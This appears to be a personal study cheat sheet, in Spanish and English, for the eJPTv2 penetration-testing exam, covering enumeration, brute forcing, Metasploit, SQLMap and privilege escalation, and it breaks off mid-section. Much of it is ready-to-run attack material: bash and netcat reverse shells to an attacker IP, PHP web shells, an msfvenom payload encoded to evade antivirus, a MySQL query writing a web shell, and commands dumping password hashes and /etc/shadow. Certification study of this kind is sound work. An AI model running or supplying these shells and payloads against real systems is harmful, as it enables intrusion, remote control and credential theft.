# Mi eJPTv2

## Basics

- **Curl & Wget**

    - CURL
        
        Curl por GET
        
        ```bash
        curl -s -X GET "<http://IP>"
        
        ```
        
        CURL cookie setting
        
        ```bash
        'Obtención de cookie y datos:'
        
        curl -i <http://IP>
        
        Output:
        
        HTTP/1.1 200 OK
        Server: nginx/1.18.0 (Ubuntu)
        Date: Wed, 16 Oct 2024 19:15:03 GMT
        Content-Type: text/html
        Content-Length: 1145
        Connection: keep-alive
        Set-Cookie: THM=Guest; expires=Wed, 16-Oct-2024 20:05:03 GMT; path=/
        Vary: Accept-Encoding
        ```
        
        Modificar valor cookie
        
        ```bash
        
        curl -b "THM=Admin" '<http://10.10.203.238/challenges/chall2.php>'
        ```
        
        Verificar web
        
        ```bash
        curl -s -o /dev/null -w "%{http_code}\n" http://url
        
        -s (silent): Suprime la barra de progreso y los mensajes de error.
        -o /dev/null: Redirige la salida del contenido de la respuesta a /dev/null (básicamente, lo descarta).
        -w "%{http_code}\n": Muestra solo el código de estado HTTP de la respuesta (por ejemplo, 200 para éxito, 404 para no encontrado, 500 para error del servidor, etc.).
        
        ```
        
    -  WGET
        
        ```bash
        # Descargar archivo
        wget http://example.com/file
        
        # Descargar archivo renombrado
        wget -O filenmae http://example.com/file
        
        # Descargar mas de un fichero
        wget http://example.com/file1 http://example.com/file2
        
        # Descargar todos los archivos del servidor
        wget -r http://example.com/directory_files
        ```
        
    
- **Tratamiento TTY**
    
    1.
    
    ```bash
    script /dev/null -c bash
    CTRL + Z
    stty raw -echo; fg
    reset xterm
    export TERM=xterm
    export SHELL=bash
    ```
    
- **Gestión ficheros**
    - **Upload**
        
        
        Upload files to FTP
        
        ```bash
        curl -T shell.php -u "usuari:password" ftp://IP_SERVIDOR/CARPETA/fitxer.*
        
        Ex:
        
        curl -T shell.php -u "anonymous:anonymous" ftp://172.17.0.3:21/upload/shell.php
        ```
        
    - **Download**
        
        Netcat
        
        ```bash
        # Attack Machine
         nc -lvp 4444 > FiletoDownload
        
        # Victim Machine
        nc 192.168.1.35 4444 -w 3 < FiletoDownload
        
        ```
        
        Montar un servidor web
        
        ```bash
        
        # Attack Machine
        python -m SimpleHTTPServer 8080
        python3 -m http.server 80 (dins de la carpeta on tenim els fitxers)
        
        # Victim Machine
        wget attacker_IP/file
        
        Ex: 
        wget http://192.168.1.39:8080/FiletoDownload
        
        ```
        
        SCP
        
        ```bash
        #Uploading a file from a local computer to a remote one:
        
        scp /path/to/local/file username@hostname:/path/to/remote/file
        
        #Downloading a file from a remote system to your computer:
        
        scp username@hostname:/path/to/remote/file /path/to/local/file
        
        ```

## Utils

- **Local Port Forwarding (SSH)**

    Para acceder a un servicio que hay en una maquina remota y que no es accesible desde el exterior, únicamente desde localhost.  Aplica cuando obtenemos acceso a una maquina y vemos algún servicio corriendo solo en local.

    ```bash
    # Victim machine: 
    10.129.88.226
    # Service in victim machine visble only on local host
    postgresql 
    port 5432
    # User in victim machine : 
    Christine (with credentials)
    
    # Attacker machine
    localhost
    # Port
    1111
    
    Conection:
    
     
    # Use for example port 1111 in this case
    
    ❯ ssh -L 1111:127.0.0.1:5432 christine@10.129.88.226
    
    # Connection with remote postgresql
     
    ❯ psql -h 127.0.0.1 -p 1111 -U christine
    ```
    
- **Metasploit**
    
    
    - **Basic options**
        - Search for module:
        
        ```bash
        msf > search [regex]
        ```
        
        - Specify and exploit to use:
        
        ```bash
        msf > use exploit/[ExploitPath]
        ```
        
        - Specify a Payload to use:
        
        ```bash
        msf > set PAYLOAD [PayloadPath]
        ```
        
        - Show options for the current modules:
        
        ```bash
        msf > show options
        ```
        
        - Set options:
        
        ```bash
        msf > set [Option] [Value]
        ```
        
        - Start exploit:
        
        ```
        msf > exploit
        ```
        
    - **Meterpreter**
        - Base Commands:
  
            - `? / help` : Display a summary of commands exit / quit: Exit the Meterpreter session
            - `sysinfo`: Show the system name and OS type
            - `shutdown / reboot` : Self-explanatory
  
        - File System Commands:
  
            - `cd` : Change directory
            - `lcd` : Change directory on local (attacker's) machine
            - `pwd / getwd` : Display current working directory
            - `ls` : Show the contents of the directory
            - `cat` : Display the contents of a file on screen
            - `download / upload` : Move files to/from the target machine
            - `mkdir / rmdir` : Make / remove directory
            - `edit` : Open a file in the default editor (typically vi)
        
        - Process Commands:
        
            - `getpid` : Display the process ID that Meterpreter is running inside.
            - `getuid` : Display the user ID that Meterpreter is running with.
            - `ps` : Display process list.
            - `kill` : Terminate a process given its process ID.
            - `execute` : Run a given program with the privileges of the process the Meterpreter is loaded in.
            - `migrate` : Jump to a given destination process ID
        
        - Network Commands:
        
            - `ipconfig` : Show network interface information
            - `portfwd` : Forward packets through TCP session
            - `route` : Manage/view the system's routing table
        
        - Other Commands:
        
            - `idletime`: Display the duration that the GUI of thetarget machine has been idle.
            - `uictl [enable/disable] [keyboard/mouse]` : Enable/disable either the mouse or keyboard of the target machine.
            - `screenshot` : Save as an image a screenshot of the target machine.
        
        - Additional Modules:
        
            - `use [module]` : Load the specified module
            - **Examples**:
                - `use priv` : Load the priv module
                - `hashdump` : Dump the hashes from the box
                - `timestomp` : Alter NTFS file timestamps
    
    - **Manage Sessions**

       - **Multiple Exploitation**
   
            - Run the exploit expecting a single session that is immediately backgrounded:
            
            ```bash
            msf > exploit -z
            ```
            
            - Run the exploit in the background expecting one or more sessions that are immediately backgrounded:
            
            ```bash
            msf > exploit –j
            ```
            
            - List all current jobs `exploit listeners`:
            
            ```bash
            msf > jobs –l
            ```
            
            - Kill a job:
            
            ```bash
            msf > jobs –k [JobID]
            ```
            
       - **Multiple Sessions**
            
            - List all backgrounded sessions:
            
            ```bash
            msf > sessions -l
            ```
            
            - Interact with a backgrounded session:
            
            ```bash
            msf > session -i [SessionID]
            ```
            
            - Background the current interactive session:
            
            ```bash
            meterpreter > <Ctrl+Z>
            ```
            
            or
            
            ```bash
            meterpreter > background
            ```
            
            - Routing Through Sessions:
            
            All modules against the target subnet mask will be pivoted through this session.
            
            ```bash
            msf > route add [Subnet to Route To]
            [Subnet Netmask] [SessionID]
            ```
            
- **Msfvenom**
    
    
    ```bash
    $ msfvenom –p [PayloadPath]
    –f [FormatType]
    LHOST=[LocalHost (if reverse conn.)]
    LPORT=[LocalPort]
    ```
    
    - Example: Reverse Meterpreter payload as an executable and redirected into a file:
        
        ```bash
        $ msfvenom -p windows/meterpreter/
        reverse_tcp -f exe LHOST=192.168.1.1
        LPORT=4444 > met.exe
        ```
        
    - Format Options **(specified with –f)** --help-formats – List available output formats
  
        - `exe` – Executable
        - `pl` – Perl
        - `rb` – Ruby
        - `raw` – Raw shellcode
        - `c` – C code
    
    - Encoding Payloads with msfvenom
        
        msfvenom can be used to apply a level of encoding for anti-virus bypass. For example run msfvenom with `-l encoders` to get a list of encoders.
        
        ```bash
        $ msfvenom -p [Payload] -e [Encoder] -f
        [FormatType] -i [EncodeInterations]
        LHOST=[LocalHost (if reverse conn.)]
        LPORT=[LocalPort]
        ```
        
    
    - Example: Encode a payload from msfpayload 5 times using shikata-ga-nai encoder and output as executable:
        
        ```bash
        $ msfvenom -p windows/meterpreter/
        reverse_tcp -i 5 -e x86/shikata_ga_nai -f
        exe LHOST=192.168.1.1 LPORT=4444 > mal.exe
        ```
        
- **Pentesting CI/CD**
    
    
    - **Jenkins Security**
        
        Enumeration
        
        ```sql
        msf> use auxiliary/scanner/http/jenkins_enum
        ```
        
        Execute commands without authentication
        
        ```sql
        msf> use auxiliary/scanner/http/jenkins_command
        ```
        
    
- **Gestores de Contenido**
    
    **WordPress**
    
    Enumeración general WordPress
    
    Enumerar usuarios
    
    ```bash
    wpscan --url http://exmaple.com -e u
    -u : username
    -p: password
    ```
    
    Fuerza burta usuario
    
    ```bash
    wpscan --url http://exmaple.com -U usuario -P /usr/share/wordlists/rockyou.txt
    ```
    
    Plugin scan
    
    ```bash
    wpscan --uel http://example.con -e u,p --api-toke='API'
    # La API la sacanos del perfil de nuestra cuenta de Webscan
    
    wpscan --uel http://example.con -e u,p --api-toke='API' --plugibs.detection aggressive -L 50
    
    # Modo deteccion agresivo con 50 hilos
    ```
    
    Fuzzear Plugins WordPress
    
    ```bash
    git clone https://github.com/Perfectdotexe/WordPress-Plugins-List.git
    plugins.txt
    
    Probar el listado de plugins en el directorio mediante fuzzing web
    
    gobuster dir -u 'http://example.com/wp-content/plugins' -w plugins.txt
    ```
    
    ```bash
     wpscan --url http://example -P /usr/share/wordlists/rockyou.txt
    
    # Ignore TLS check (--disable-tls-checks)
    wpscan --url https://example.com -P wordlist.txt --disable-tls-checks
    
    # -U : Specifify username
    # --rua: random user agent
    # --http-auth username:password
    # -e: enumerate
    #  ap: All plugins
    #  at: All themes
    #  tt: Timthumbs
    #  cb: Config backups
    #  dbe: Db exports
    #  u: User IDs range
    #  m: Media IDs range
    
    wpscan --rua -e ap,at,tt,cb,dbe,u,m --url https://example.com -U username -P /usr/share/wordlists/rockyou.txt
    ```
    
    **Common directories**
    
    ```bash
    /author/admin/
    /index.php/author/admin/
    /license.txt
    /readme.html
    /robots.txt
    
    /wp-admin/
    /wp-admin/admin-ajax.php
    /wp-admin/upload.php
    /wp-content/
    /wp-content/uploads/
    /wp-includes/
    /wp-json/wp/v1/
    /wp-json/wp/v1/users
    /wp-json/wp/v2/
    /wp-json/wp/v2/users
    /wp-login.php
    
    # Users
    /?author=1
    /?author=2
    
    # Posts
    /?p=1
    /?p=2
    
    # Private/Draft Posts (WordPress <= 5.2.3) 
    /?static=1
    ```
    
    Parametro busqueda WordPress
    
    ```bash
    # Todos los WordPress presnetan un parametro de busqueda 
    http://example.es/course/
    
    /s=
    
    http://example.es/course/s=Cadena a buscar
    
    # Si buscamos cadenas huerfanas podemos acceder a recursos que normalmente
    # no podriamos.
    
    ```
    
    **Mongo**
    
    ```bash
    #Conexión remotoa BD
    
    mongo <target-IP>:<port>
    
    show dbs # Muestra las bases de datos
    use db # selecciona la base de datos para trabajar
    show collections # Muestra contenido de la bd (ex:admin,config)
    db.admin.find() # Muestra contenido de la tabla
    db.admin.find().pretty()# Muestra el contenido de la tabla en formato leible
    ```
    
    **Drupal**
    
    Drupa IP
    
    ```bash
    whatweb http://example.com
    ```
    
    Metasploit
    
    ```bash
    Drupa <=8 vulnerable
    
    msf> search drupal 8
    
    Una vez explotado, enumerar Drupal
    
    shell> find / -name settings.php 2>/dev/null
    /var/www/html/sites/default/settings.php
    
    Buscar credenciales en el fichero de configuración
    ```
- **SQLMap**
    
    
    Eunumerar BD
    
    ```bash
    # Conocer las bases de datos.
    
    sqlmap -u 'http://<IP máquina víctima>' --forms --dbs --batch
    
    # Conocer las tablas de la BD (Ex: Webapp)
    
    sqlmap -u 'http://<IP máquina víctima>' --forms -D Webapp --tables --batch
    
    # Conocer las columnas de la tabla de la BD
    
    sqlmap -u 'http://<IP máquina víctima>' --forms -D Webapp -T Users --columns --batch
    
    # Conocer la información que hay en esas columnas (ex: username,password)
    
    sqlmap -u 'http://<IP máquina víctima>' --forms -D Webapp -T Users -C username,password --dump --batch
    ```
    
    Para parametros que sabemos vulnerables
    
    ```bash
    sqlmap -u 'http://victim.site/view.php?id=1141' -p id
    ```
    
    Cuando estamos autenticados como algún usuario, 
    
    ```bash
    sqlmap -u 'http://victim.site/dashboard.php?search=1' --cookie "PHPSESSID=a3tqcq298ggfth9njj2mgg6ch1"
    ```
    
    Para ejecutar comandos de sistema:
    
    ```bash
    sqlmap -u 'http://victim.site/dashboard.php?search=1' --os-shell
    ```

## Enumeracion

### Enumeración de servicios

### Port 21 | FTP

Conexión con usuario anónimo por defecto:

```bash
ftp <IP>
>anonymous
>anonymous
```

Escaneo con Nmap para servicio FTP

```bash
# Enumeración versión ftp

nmap -sV -p 21 --open <IP>

# Verificar conexión anonima

nmap --script=ftp-anon -p21 10.10.14.12

# Todos los scripts de nmap para puerto 21

nmap --script ftp-* -p 21 <IP>

# Para ver los scripts relacionados con FTP

find / -type f -name ftp* 2>/dev/null | grep scripts

/usr/share/nmap/scripts/ftp-syst.nse
/usr/share/nmap/scripts/ftp-vsftpd-backdoor.nse
/usr/share/nmap/scripts/ftp-vuln-cve2010-4221.nse
/usr/share/nmap/scripts/ftp-proftpd-backdoor.nse
/usr/share/nmap/scripts/ftp-bounce.nse
/usr/share/nmap/scripts/ftp-libopie.nse
/usr/share/nmap/scripts/ftp-anon.nse
/usr/share/nmap/scripts/ftp-brute.nse
```

Banner grab

```bash
telnet <IP> 21
nc <IP> 21
```

Descargar  ficheros de un FTP

```bash
# Local

ftp> get Directorio\ archivo.txt

# Remoto

wget -m ftp://anonymous:anonymous@IP
wget -m --no-passive ftp://anonymous:anonymous@IP
```

Subir fichero a FTP

```bash

# Local
touch ficehro.txt

# En servidor FTP
ftp> put fichero.txt

```

Modulo para metasploit

```bash
use auxiliary/scanner/ftp/anonymous
```

Bruteforce FTP

```bash
# Conociendo usuario
hydra -l admin -P /usr/share/wordlist/rockyou.txt ftp://192.168.0.1

#Sin conocer user ni password
hydra -L userlist.txt -P passlist.txt ftp://192.168.0.1
```

### Port  22 | SSH

Conexión ssh

```bash
nc IP 22
ssh usuario@<IP>
```

Banner grabbing

```bash
nc -vn <IP> 22
```

Scripts Nmap

```bash
find / -type f -name ftp* 2>/dev/null | grep scripts

```

```bash
nmap -p 22 --script ssh2-enum-algos <TARGET_IP>
nmap -p 22 --script ssh-hostkey --script-args ssh_hostkey=full <TARGET_IP>
nmap -p 22 --script ssh-auth-methods --script-args="ssh.user=<USER>" <TARGET_IP>
nmap -p 22 --script=ssh-run --script-args="ssh-run.cmd=cat /home/student/FLAG, ssh-run.username=<USER>, ssh-run.password=<PW>" <TARGET_IP>
nmap -p 22 --script=ssh-brute --script-args userdb=<USERS_LIST> <TARGET_IP>
```

Modulos Metasploit

```bash
auxiliary/scanner/ssh/ssh_version
auxiliary/scanner/ssh/ssh_login

# Fuerza bruta para enumerar usuarios
msf> use scanner/ssh/ssh_enumusers

# Fuerza burta para Clave Privada
msf> use scanner/ssh/ssh_enumusers
```

Bruteforce SSH

```bash
hydra -l <usuario> -P /usr/share/wordlist/rockyou.txt ssh
```

### Port  23 | Telnet

Conexión telnet

```bash
telnet <IP>
```

Banner grabbing

```bash
nc -vn <IP> 23
```

Scripts nmap

```bash
nmap -n -sV -Pn --script "*telnet* and safe" -p 23 <IP>
```

### Port 25,465 | SMTP

Conexión SMPT

```bash
openssl s_client -crlf -connext smtp.examplmail.org:465 #SSl/TLS sin starttls
openssl s_client -starttls smtp -crlf -connect smpt.examplemail.org:465
```

Banner grabbing 

```bash
nc -vn <IP> 25
```

Scripts nmap

```bash
nmap -p25 --script smtp-commands <IP>
nmap -p25 --script smtp-open-relay <IP> -v
```

Bruteforce smtp

```bash
#Script Nmp
nmap --script smtp-enum-users <IP>

# Modulo metasploit enumerar usuarios por fuerza bruta
auxiliary/scanner/smtp/smtp_enum
```

### Port  80, 443 | Pentesting Web

[**Web Pentesting**](WebPentesting.md)


### Port  137,138,139 | NetBios

Enumerar servicio NetBios 

```bash
nmblookup -A <IP>
nbtscan <IP>/30
sudo nmap -sU -sV -T4 --script nbstat.nse -p137 -Pn -n <IP>
```

### Port 139, 445 | SMB

Enumeración automatica con Enum4linux

```bash
enum4linux -a target_ip

enum4linux -a [-u "<username>" -p "<passwd>"] <IP>
enum4linux-ng -A [-u "<username>" -p "<passwd>"] <IP>
```

Enumeración con nmap

```bash
nmap --script "safe or smb-enum-*" -p 445 <IP>
nmap --script=smb-enum-users,smb-os-discovery,smb-enum-shares,smb-enum-groups,smb-enum-domains <IP> -p 135,139,445 -v
nmap -p445 --script=smb-vuln-* <IP> -v

```

Escanear una red en busca de hosts

```bash
nbtscan -r <IP>/24
```

Para poder usar algun exploit para smb, necesitamos conocer la versión. Podemos hacerlo con el modúlo de metasploit:

```bash
MSF _auxiliary/scanner/smb/smb_version

Buscar exploit:

msf> search type:exploit platform:windows target:2008 smb
searchsploit microsoft smb
```

Obtener información del entorno SMB

```bash
#Connect to the rpc
rpcclient -U "" -N <IP> #No creds
rpcclient //machine.htb -U domain.local/USERNAME%754d87d42adabcca32bdb34a876cbffb  --pw-nt-hash
rpcclient -U "username%passwd" <IP> #With creds
```

Listar recursos,  usuarios, grupos,etc

```bash
# SMBClinet (no muestra permisos sobre los recuros)

smbclient -L <IP>smb -N 

- N: null session

# Crackmapexec (listamos recrusos sin disponer de credenciales)

crackmapexec smb <IP> -u '' -p '' --shares  # Null user

crackmapexec smb <IP> --users [-u <username> -p <password>]
crackmapexec smb <IP> --groups [-u <username> -p <password>]
crackmapexec smb <IP> --groups --loggedon-users [-u <username> -p <password>]

crackmapexec smb <IP> -u 'username' -p 'password' --shares #Guest user
crackmapexec smb <IP> -u 'username' -H '<HASH>' --shares #Guest user

# SMBMap

smbmap -u guest -p "" -d . -H <TARGET_IP>
smbmap -u <USER> -p '<PW>' -d . -H <TARGET_IP>
smbmap -u <USER> -p '<PW>' -H <TARGET_IP> -x 'ipconfig' ## Run a command
smbmap -u <USER> -p '<PW>' -H <TARGET_IP> -L ## List all drives
smbmap -u <USER> -p '<PW>' -H <TARGET_IP> -r 'C$' ## List dir content
smbmap -u <USER> -p '<PW>' -H <TARGET_IP> --upload '/root/sample_backdoor' 'C$\sample_backdoor' ## Upload a file
smbmap -u <USER> -p '<PW>' -H <TARGET_IP> --download 'C$\flag.txt' ## Download a file

# Metasploit

use auxiliary/scanner/smb/smb_lookupsid
set rhosts hostname.local
run
```

Conectar/Listar carpeta compartida

```bash
# SMBClinet

smbclient //<IP>/<Folder> -N # Null user
	
smbclinet //<IP>/<folder> -U "username"

# Smbmap, without folder it list everything

smbmap [-u "username" -p "password"] -R [Folder] -H <IP> [-P <PORT>] # Recursive list
smbmap [-u "username" -p "password"] -r [Folder] -H <IP> [-P <PORT>] # Non-Recursive list
smbmap -u "username" -p "<NT>:<LM>" [-r/-R] [Folder] -H <IP> [-P <PORT>] #Pass-the-Hash
```

Metasploit modules

```bash
use auxiliary/scanner/smb/smb_version
use auxiliary/scanner/smb/smb_enumusers
use auxiliary/scanner/smb/smb_login
use auxiliary/scanner/smb/pipe_auditor
```

Los nombres de recursos compartidos comunes para objetivos de Windows son

- C$
- D$
- ADMIN$
- IPC$
- PRINT$
- FAX$
- SYSVOL
- NETLOGON

Bruteforce SMB

```bash
#Nmap

nmap --script smb-brute -p 445 <IP>

hydra -l Administrator -P words.txt <IP> smb -t 1
```

### Port 3306 | MySQL

Conexión

```bash
# Local

mysql -u root # Conectar como root sin password
mysql -u root -p # Password requerido

# Remoto

mysql -h <Hostname> -u root
mysql -h <Hostname> -u root@localhost
```

Enumeración

```bash
# Nmap

nmap -sV -p 3306 --script mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122 <IP>

# Metasploit

use auxiliary/scanner/mysql/mysql_schemadump
use auxiliary/scanner/mysql/mysql_writable_dirs
use auxiliary/scanner/mysql/mysql_file_enum
use auxiliary/scanner/mysql/mysql_hashdump
use auxiliary/scanner/mysql/mysql_login
```

Comandos MySQL

```bash
show databases;
use <database>;
connect <database>;
show tables;
describe <table_name>;
show columns from <table>;

select version(); #version
select @@version(); #version
select user(); #User
select database(); #database name

# Obtener shell
\! sh

#Basic MySQLi
Union Select 1,2,3,4,group_concat(0x7c,table_name,0x7C) from information_schema.tables
Union Select 1,2,3,4,column_name from information_schema.columns where table_name="<TABLE NAME>"

#Read & Write
## Yo need FILE privilege to read & write to files.
select load_file('/var/lib/mysql-files/key.txt'); #Read file
select 1,2,"<?php echo shell_exec($_GET['c']);?>",4 into OUTFILE 'C:/xampp/htdocs/back.php'

#Try to change MySQL root password
UPDATE mysql.user SET Password=PASSWORD('MyNewPass') WHERE User='root';
UPDATE mysql.user SET authentication_string=PASSWORD('MyNewPass') WHERE User='root';
FLUSH PRIVILEGES;
quit;

# Mysql client
help
show databases;
use <DB_NAME>;
select count(*) from <TABLE_NAME>;
select load_file("/etc/shadow");
```

Enumerar permisos MySQL

```bash
SHOW GRANTS [FOR user];
SHOW GRANTS;
SHOW GRANTS FOR 'root'@'localhost';
SHOW GRANTS FOR CURRENT_USER();

# Get users, permissions & hashes
SELECT * FROM mysql.user;

#From DB
select * from mysql.user where user='root';
## Get users with file_priv
select user,file_priv from mysql.user where file_priv='Y';
## Get users with Super_priv
select user,Super_priv from mysql.user where Super_priv='Y';

# List functions
SELECT routine_name FROM information_schema.routines WHERE routine_type = 'FUNCTION';
#@ Functions not from sys. db
SELECT routine_name FROM information_schema.routines WHERE routine_type = 'FUNCTION' AND routine_schema!='sys';
```

Credenciales

```bash
cat /etc/mysql/debian.cnf

Dentro del archivo: /var/lib/mysql/mysql/user.MYD puedes encontrar todos los hashes de los usuarios de MySQL (los que puedes extraer de mysql.user dentro de la base de datos).

Puedes extraerlos haciendo:

bash

grep -oaE "[-_\.\*a-Z0-9]{3,}" /var/lib/mysql/mysql/user.MYD | grep -v "mysql_native_password"
```

### Port 1433 | MSSQL

Enumeración automatica

```bash
# Nmap

nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 <IP>

# Metasploit

msf> use auxiliary/scanner/mssql/mssql_ping
```

Metasploit (necesita credenciales)

```bash
#Set USERNAME, RHOSTS and PASSWORD
#Set DOMAIN and USE_WINDOWS_AUTHENT if domain is used

#Steal NTLM
msf> use auxiliary/admin/mssql/mssql_ntlm_stealer #Steal NTLM hash, before executing run Responder

#Info gathering
msf> use admin/mssql/mssql_enum #Security checks
msf> use admin/mssql/mssql_enum_domain_accounts
msf> use admin/mssql/mssql_enum_sql_logins
msf> use auxiliary/admin/mssql/mssql_findandsampledata
msf> use auxiliary/scanner/mssql/mssql_hashdump
msf> use auxiliary/scanner/mssql/mssql_schemadump
msf >use auxiliary/scanner/mssql/mssql_login

#Search for insteresting data
msf> use auxiliary/admin/mssql/mssql_findandsampledata
msf> use auxiliary/admin/mssql/mssql_idf

#Privesc
msf> use exploit/windows/mssql/mssql_linkcrawler
msf> use admin/mssql/mssql_escalate_execute_as #If the user has IMPERSONATION privilege, this will try to escalate
msf> use admin/mssql/mssql_escalate_dbowner #Escalate from db_owner to sysadmin

#Code execution
msf> use admin/mssql/mssql_exec #Execute commands
msf> use exploit/windows/mssql/mssql_payload #Uploads and execute a payload

#Add new admin user from meterpreter session
msf> use windows/manage/mssql_local_auth_bypass
```

### Port 873 | Rsync

Banner grabbing

```bash
nc -nv <IP> 873
```

Enumeration nmap

```bash
nmap -sV --script "rsync-list-modules" -p 873 target_host
```

Enumeration metasploit

```bash
msf> use auxiliary/scanner/rsync/modules_list
```

Enumerar carpetas compartidas

```bash
rsync target_host::

#Para archivos y permisos

rsync -av --list-only rsync://target_host/module_name

# Exfiltrar datos:

❯ rsync -avz target_host::module_name /local/directory/

```

### Port 5432 | PostgreSQL

Conectar con psql

```bash
psql -h <target-host> -p <port> -U <username> -W
```

Enumerar 

```bash
nmap -sV -p 5432 <target-host>

# Version
nmap -sV --script=postgresql-info -p 5432 <target-host>
```

Enumerar BD y tablas

```bash
# List all databases
\l

# Switch to a database
\c <database_name>

# List tables in the current database
\dt

# Extract data from a specific table:
SELECT * FROM <table_name>;

# Dumping Hashes
SELECT usename, passwd FROM pg_shadow;
```

Accessing File System

```bash
COPY (SELECT * FROM sensitive_table) TO '/tmp/sensitive_data.txt';
```

Bruteforce

```bash
hydra -L userlist.txt -P passlist.txt <target-ip> postgres
```

## Reconocimiento

### Network Mapping

IP

```bash
# Linux
ifconfig
ip a 
ip -br -c a

# Windows 
ipconfig /all

# Routing Linux
ip route

#Routing Windows
route print
```

Ports

```bash
# Linux
netstat -tunp
netstat -tulpn
netstt -p tcp -p upd

# Winndows

netstat -ano

```

Barrido de Ip’s (ICMP Discovery/ Ping Scan)

```bash

nmap -sn 10.10.10.0/24

nmap -n -sn <IP>/24 -oG - | awk '/Up$/{print $2}' >> nmapresults.txt

fping -a -g 10.10.10.0/24 2>/dev/null | tee hosts_activos.txt
```

ARP Discovery

```bash

#Local Linux
ip neighbour

#Local Windows 
arp -a

#Arp-scan

netdiscover -i eth1 -r <IP>/24
arp-scan -I eth1 <IP>/24

# Nmap:
nmap -n -sn <IP>/24 -PR -oG - | awk '/Up$/{print $2}'
```

### Nmap

Nmap Options

```bash
# Options

-p- : Escanea todos los puertos
-Pn : Desactiva host discovery, asume que el host está activo 
-n  : Desactiva resolución DNS
-sn : Descativa escaneo de puertos. Solo verifica host discovery.
-sL : No escanea, solo lista los nombres de los host
-F  : Fast mode. Puede omitir servicios en puertos altos.
-T5 : Velocidad del escanero

# Scan Types

-sS: TCP SYN Scan (aka Stealth Scan)
-sT: TCP Connect Scan 
-sU: UDP Scan
-sC: Ejecuta los scripts predeterminados de Nmap
-sV: Service Version information
-O: Operating System information
```

Escanear un Rango de Red

```bash
nmap -sn 10.129.2.0/24 -oG hosts_activos.txt

#  10.129.2.0/24: Especifica el rango de red objetivo.

# -sn: Desactiva el escaneo de puertos, realizando solo el descubrimiento de hosts.

# -oA tnet | grep for | cut -d" " -f5
 Almacena los resultados en todos los formatos que comienzan con el nombre tnet.
 
 # Para escanear un único host:
 
 nmap -sn 10.129.2.18 

```

Escanear lista de IP’s:

```bash
nmap -sn -iL hosts_list.txt

-sn: Desactiva el escaneo de puertos.

-oA tnet | grep for | cut -d" " -f5 : Almacena los resultados en todos los formatos que comienzan con el nombre tnet.

-iL hosts.list.txt : Lee los hosts de la lista hosts_list.txt proporcionada.
```

Deteccion de SO y versiónes de servicios:

```bash
nmap -Pn -O -sCV <IP>

# Para hacerlo más rápido
#Puertos mas comunues

nmap -Pn -F -T5 -sV -O -sC <IP> -vvv 

# Todos los puertos abiertos

nmap -Pn -T4 --open -sS -sC -sV --min-rate-1000 --max-retries-3 -p- -oN output_file 10.10.10.2
```

Scan versions

```bash
nmap -sCV -p- -vvv 10.10.10.10
```

UDP Scan

```bash
nmap -sU -sn -sV 10.10.10
```

### MassScan

Escaneo multipe de puertos especificados contra un rango de IP’s

```bash
sudo masscan -p<port1>,<port2> <ip address/range>
```

Escaneo multiple de rango de puertos para varias IP’s:

```bash
sudo masscan -p<port1>-<portN> <ip address/range>
```

### Procedimiento 1

```bash
# Network Mapping

fping -a -g 10.10.10.0/24 2>/dev/null | tee hosts_activos.txt
arp-scan -I eth1 <IP>/24

# Nmap

nmap -v -sn 10.129.2.0/24 -oG hosts.txt && grep hosts.txt | cut -d " " -f 2
nmap -sU -sn <IP>/24 (UDP)

Podemos hacer los escaneos posteriores juntos con la lista anterior o uno por uno.

# Versiones y servicios para todos los puertos

nmap -Pn -O -sCV -vvv <IP>
nmap -Pn -O -sCV -IL hosts_activos.txt

# Full scan

nmap -p- --open -Pn -sVC -T4 -A -iL hosts.txt -oN allports.txt
```

### Procedimiento 2

```bash
Ex: 

ip a
nmap -sn 10.0.2.0/24 #manda paquetes ICMP a ese segmento de red

# Hosts: 10.0.2.43 / 10.0.2.45 / 10.0.2.46 / 10.0.2.53 / 10.0.2.55

sudo nmap -sS --min-rate 5000 -p- --open 10.0.2.43,45,46,53,55 -oN port_scan.txt
grep '^[0-9]' port_scan.txt | cut -d '/' -f1 | sort -u | xargs | tr ' ' ','

# Puertos : 22,25,45,80,445,135,139,49665,49670

nmap --open -p135,139,22,25,45,445,49665,49670,80 -sC -sV 10.0.2.43,45,46,53,55 -Pn -On full_scan.txt
```

## Explotacion

### Shells

### Rever Shells

Bash :

```bash
  #Cambiar IP / Port 

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc **IP Port** >/tmp/f

bash -i >& /dev/tcp/**IP**/**Port** 0>&1
```

### WebShell

Cmd

```php
<?php echo "<pre>" . system($_GET['cmd']) . "</pre>"; ?>

# NOTA': Puede que si no se interpreta, haya que encodear el ? de la url por un &

<%3Fphp echo "<pre>" . system($_GET['cmd']) . "</pre>"; %3F>

# Con shell_exec

<?php echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>"; ?>
```

Cmd search bar

```bash
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd']);
    }
?>
</pre>
</body>
</html>
```

Revershell PHP

```php
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/**ATTACKING IP**/**PORT** 0>&1'");?>
```

### Revershell Windows

Metasploit shell

```bash
#Parte 1
msfvenom  -p windows/meterpreter/reverse_tcp LHOST=LocalIP LPORT=4444 -f exe -o payload.exe

#Parte 2
msfconsole> use multi/handler
msfconsole>show options
msfconsole>set LHOST=LocalIP
msfconsole>set LPORT=4444
msfconsole>set PAYLOAD windows/meterpreter/reverse_tcp

```

## Escalada de privilegios

View Listen services with port

```bash
ss -tl
```

Sudo 

```bash
sudo -l
```

Capabilities

```bash
getcap -r / 2>/dev/null
```

SUID

```bash
find / -perm -u=s -type f 2>/dev/null
```

```bash
find / -perm -4000 2>/dev/null
```

Windows (Metasploit)

```bash
# Una vez tenemos acceso a la maquina con algún usuario a traves de metasploit, 
# podemos usar el siguiente modulo
meterpreter>backgound
msf6> sessions -l 
1
msf6> use local_exploit_suggester
msf6> set SESSION 1
msf6> run
```

Python Library Hijacking

```bash
# Si encontramos un script de python importanto modulos

user> sudo -l
    (root): /usr/bin/python3 /opt/scripts/example.py
